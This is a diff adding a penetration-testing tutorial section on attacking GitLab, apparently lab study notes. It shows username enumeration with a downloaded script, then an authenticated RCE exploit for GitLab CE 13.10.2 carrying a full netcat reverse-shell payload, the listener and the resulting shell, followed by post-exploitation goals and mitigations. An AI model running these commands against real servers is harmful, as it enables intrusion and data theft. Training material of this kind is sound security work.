@@ -1948,3 +1948,129 @@ GitLab has had several **critical vulnerabilities**:
 
 ---
 
+# 🛠️ Attacking GitLab
+
+Even **unauthenticated access** to GitLab can lead to **serious data exposure**. With valid credentials, attackers may uncover sensitive data or escalate to **remote code execution (RCE)**.
+
+## 🔍 Username Enumeration
+
+Although **not classified as a vulnerability** by GitLab (as per HackerOne), **user enumeration** can:
+
+* Identify valid usernames
+* Help with **password spraying attacks**
+
+### 🧪 Methods
+
+* **Manual enumeration** via `/users/sign_up`
+
+  * Enter a known username or email to check if it’s taken
+* **Automated with scripts**
+
+  * Example tool: `gitlab_userenum.sh`
+
+#### 💡 GitLab Default Lockout Policy:
+
+```ruby
+config.maximum_attempts = 10
+config.unlock_in = 10.minutes
+```
+
+* 10 failed login attempts → 10 min lockout
+* **Not configurable via GUI**
+* Must recompile GitLab to change these values
+
+#### Username enumeration script download
+```
+https://www.exploit-db.com/exploits/49821
+```
+### 🔁 Sample Enumeration Script
+
+```bash
+$ ./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt
+```
+
+**Output:**
+
+```text
+[+] The username root exists!
+[+] The username bob exists!
+```
+
+#### ⚠️ Ethical Use Notice
+
+> Do not run this against GitLab.com or systems you do not own.
+
+## 🧨 Authenticated Remote Code Execution (RCE)
+
+### ✅ Vulnerable Version
+
+* **GitLab CE ≤ 13.10.2**
+* RCE via malicious image metadata
+* Root cause: **ExifTool vulnerability**
+
+### 🧬 Prerequisites
+
+* Valid credentials (via OSINT, password reuse, etc.)
+* Or access to a self-registration instance
+
+### 📦 Exploitation Steps
+
+```bash
+$ python3 gitlab_13_10_2_rce.py \
+  -t http://gitlab.inlanefreight.local:8081 \
+  -u mrb3n -p password1 \
+  -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f'
+```
+
+**Stages:**
+
+1. Authenticate
+2. Create Payload
+3. Upload via Snippet
+4. Trigger RCE
+
+**Result:**
+
+```bash
+[+] RCE Triggered !!
+```
+
+---
+
+### 🔗 Catching the Shell
+
+```bash
+$ nc -lnvp 8443
+```
+
+**Output:**
+
+```text
+connect to [10.10.14.15] from (UNKNOWN) [10.129.201.88] 60054
+git@app04:~/gitlab-workhorse$ id
+uid=996(git) gid=997(git) groups=997(git)
+```
+
+You're now **executing commands on the GitLab server** as the `git` user.
+
+## 🔐 Post-Exploitation Potential
+
+With access to the GitLab server, attackers can:
+
+* Dump credentials and tokens
+* Access all repository data
+* Escalate privileges on the host
+* Pivot to the internal network
+
+
+## 🛡️ Mitigations
+
+| Risk                 | Mitigation                                    |
+| -------------------- | --------------------------------------------- |
+| Username enumeration | CAPTCHA, error obfuscation, rate limiting     |
+| Weak passwords       | Enforce complexity rules, password managers   |
+| Credential reuse     | Use 2FA, credential stuffing detection        |
+| RCE                  | Patch GitLab regularly, restrict file uploads |
+| Lateral movement     | Network segmentation, EDR monitoring          |
+
+---
